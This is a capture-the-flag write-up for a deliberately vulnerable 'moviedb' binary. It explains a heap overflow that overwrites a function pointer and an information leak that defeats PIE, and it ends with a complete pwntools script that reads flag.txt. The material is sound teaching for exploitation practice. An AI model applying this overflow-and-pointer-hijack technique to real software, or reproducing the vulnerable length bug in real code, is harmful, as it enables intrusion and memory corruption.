# Heap Exploit - MovieDB Writeup

Note: This guest challenge is created by Urs MÃ¼ller, urs.mueller AT protonmail.com.

## Prerequisites
The reader is assumed to have a basic understanding of the `C` programming language, the `x86_64` instruction set,
and Python.

The following tools will be used:
* GDB debugger with [PEDA](https://github.com/longld/peda)
* Python2
* [Pwntools](https://docs.pwntools.com/en/stable/) (a useful Python library for writing exploits)

All Linux terminal and GDB commands are preceeded by `$` and `#`, respectively.

* The Movie-DB binary is located in `~/challenges/challenge32/source/` and can be compiled by typing `make`.
* The exploit is located in `~/challenges/challenge32/exploit/`.

## Getting Started
In this challenge we are given a binary `moviedb` and the goal is to read the contents of the file `flag.txt`.

Let's first gather some basic information about the binary. Running the file command shows that we are dealing with a 64-bit ELF binary whose symbols have been stripped (i.e. all
variable, function, and `struct` names have been removed).
```
$ file moviedb
moviedb: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0912f612fb8ee7143a7de9a95c4a93dfe1f08270, stripped
```

We also run the PEDA `checksec` tool (inside GDB) to inspect the exploit mitigations:
```
$ gdb ./moviedb
[CUT]
# checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```
* `CANARY`: Stack canary to protect against stack-based buffer overflows; hence, buffer overflows are not feasible unless we can somehow leak the (random) canary.
* `NX`: The stack is not executable; in fact, no memory segment is executable but the code section.
* `PIE`: The application code is loaded at a random address (PIE stands for Position Independent Executable);
* `RELRO`: The dynamic linker will resolve calls to imported libraries when the function is called for the first time (instead of doing it while loading the program).

## Optional: Make it running (reversing)

Before reverse engineering a program it is often a good idea to first fool around with
the program to obtain a feel for what the program does and how it works. However, when we run the program it immediately exits with the following error message:
```
$ ./moviedb
File does not exist... exiting now: No such file or directory
```
At this point we could start reverse engineering the code and see which file is missing. While this is certainfly
feasible for such a small program, it is usually more straightforward to simply use the `strace` command line tool:

```
$ strace -e open ./moviedb
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
open("welcome-message.txt", O_RDONLY)   = -1 ENOENT (No such file or directory)
File does not exist... exiting now: No such file or directory
+++ exited with 1 +++
```
Note that the file `welcome-message.txt` is missing. Let's create our own and verify that the program starts correctly
(note our custom welcome message in the output):
```
$ echo "This is our own welcome message" > welcome-message.txt
$ ./moviedb
This is our own welcome message

1) Add Movie
2) Remove Movie
3) Edit Movie
4) Print Movies
5) Exit

```

## Usage

It seems to be some kind of movie database, where movie titles can be added, removed, edited and printed.

```

After playing around with it the time is ripe to take a look at the source code (or reverse engineer the binary) and
find vulnerabilities.

## Vulnerabilities

At this point you should have a good understanding of how the program is implemented and we are ready to look at the
vulnerabilities (this is a pwning challenge after all).

### Heap Overflow

The header file `movie.h` defines two constants that describe the maximum length of a movie title and description:
```
#define MAX_MOVIE_NAME_LEN 40
#define MAX_MOVIE_DESCRIPTION_LEN 512

struct Movie
{
	char description[MAX_MOVIE_DESCRIPTION_LEN];
	char name[MAX_MOVIE_NAME_LEN];
	int duration;
	int year;
	void (*print)();
	struct list_head list;
};
```

However, in the function `edit_movie` an invalid title length is specified (`MAX_MOVIE_DESCRIPTON_LEN` is used instead of `MAX_MOVIE_TITLE_LEN`):

```
void edit_movie()
{
	char name[MAX_MOVIE_NAME_LEN];
	printf("Name: ");
	read_n_line(name, MAX_MOVIE_NAME_LEN);

	struct Movie *m = find_movie(name);
	if ( !m )
	{
		puts("Movie does not exist");
		return;
	}

	printf("New name: ");
	read_n_line(m->name, MAX_MOVIE_DESCRIPTION_LEN);

	printf("New description: ");
	read_n_line(m->description, MAX_MOVIE_DESCRIPTION_LEN);

	printf("New duration: ");
	m->duration = read_int_line();

	printf("New year: ");
	m->year = read_int_line();
}
```

This of course leads to an overflow since `MAX_MOVIE_DESCRIPTION_LEN > MAX_MOVIE_NAME_LEN`. This allows us to
override the `void (*print)()` function pointer.

### Information Leak
We have seen that we can override a function pointer with an arbitrary value, but what should this value be? Recall
that the code is PIE compiled and therefore all code addresses are randomized. Since this is a 64-bit binary the
entropy of the randomness is too damn high for a brute-force attack. But hey, we can always find a vulnerability
that leaks some code address! This type of vulnerability is usually called an information leak.

To read up to `n` bytes of a (newline-terminated) input line the following two functions are used:
```
size_t read_n_until(char *dst, size_t nbytes, char c)
{
	char in;
	size_t n;
	for ( n = 0; n < nbytes; ++n )
	{
		if ( read(0, &in, 1) != 1 )
		{
			puts("Error while reading... exiting now.");
			exit(1);
		}

		if ( in == c )
		{
			dst[n] = 0;
			break;
		}

		dst[n] = in;
	}

	return n;
}

size_t read_n_line(char *dst, size_t nbytes)
{
	return read_n_until(dst, nbytes, '\n');
}
```
Note that the second `if`-statement is never executed if the input does not contain a newline character. Hence, if we create a movie with the following values (Python string syntax):

* `description`: `'A' * MAX_MOVIE_DESCRIPTION_LEN`
* `name`: `'A' * MAX_MOVIE_NAME_LEN`
* `duration`: `0xffffffff`
* `year`: `0xffffffff`

we can leak the `print` function pointer by simply printing a movie. It is worth mentioning that we can pick any value
for `duration` and `year` as long as they do not contain any `null`-bytes. For example, `0x3a00fe2a` does not work because
`printf` would stop printing at the `null`-byte and never get to the function pointer value.

## Exploit

The following function, which reads a file and displays the content, plays a crucial role in the exploit (recall that we have seen the error message in a previous section):
```
void print_welcome_message(char *file_name)
{
	FILE *fd;
	int c;

	if ( !(fd = fopen(file_name, "rb")) )
	{
		perror("Movie does not exist... exiting now.");
		exit(1);
	}

	while ( 1 )
	{
		c = getc(fd);
		if ( c == -1 )
			break;
		putchar(c);
	}

	fclose(fd);
}
```

Note that if we call this function with a movie `struct` (instead of a file name) then the program opens a file with the name of the movie description (this is due to the fact that the movie description is stored in the beginning of the movie `struct`).

We can now read the file `flag.txt` as follows:
1. Create a movie as described in "Information Leakage" above. Leak the base address of the `moviedb` code section from which we can readily compute the address of the function `print_welcome_message` (if you disassemble the binary you will see that the function `print_welcome_message` is at offset `0xee0`).
2. Create a new movie with description `flag.txt`. Then override the function pointer `void (*print)()` such that it points to the function `print_welcome_message` .
3. Print the movie created in step two (this step will call `print_welcome_message` with the movie as argument)

The complete exploit is given in the following Python script:
```python
from pwn import *

MAX_MOVIE_NAME_LEN = 40
MAX_MOVIE_DESCRIPTION_LEN = 512

s = process('./moviedb')
s.readuntil('>')

### STEP 1 ###

s.sendline('1')
s.sendafter('Name: ', 'A' * MAX_MOVIE_NAME_LEN)
s.sendafter('Description: ', 'A' * MAX_MOVIE_DESCRIPTION_LEN)
s.sendlineafter('Year: ', str(0xffffffff))
s.sendlineafter('Duration: ', str(0xffffffff))
s.sendlineafter('> ', '4')

data = s.readuntil(p64(0xffffffffffffffff))
bin_base = u64(s.read(6).ljust(8, '\x00')) - 0x12b0
print '[*] Binary base address: 0x%016x' % bin_base
s.readuntil('>')


### STEP 2 ####

# Add a new movie (note that we cannot edit the old movie since the program does not find it due to the invalid name)
s.sendline('1')
s.sendlineafter('Name: ', 'Title')
s.sendlineafter('Description: ', 'XXXX')
s.sendlineafter('Year: ', '42')
s.sendlineafter('Duration: ', '42')
s.sendlineafter('> ', '4')

# Overflow function pointer
s.sendline('3')
s.sendlineafter('Name: ', 'Title')
s.sendlineafter('New name: ', p64(bin_base + 0xee0) * 8)
s.sendlineafter('New description: ', 'flag.txt')
s.sendlineafter('New duration: ', '42')
s.sendlineafter('New year: ', '42')

# Print movie and read the flag. Note that we use s.interactive() here because the program crashes afterwards and this
# is a simple way to retrieve all program output (normally s.interactive() is used to get an interactive shell).
s.sendlineafter('> ', '4')
s.interactive()
```
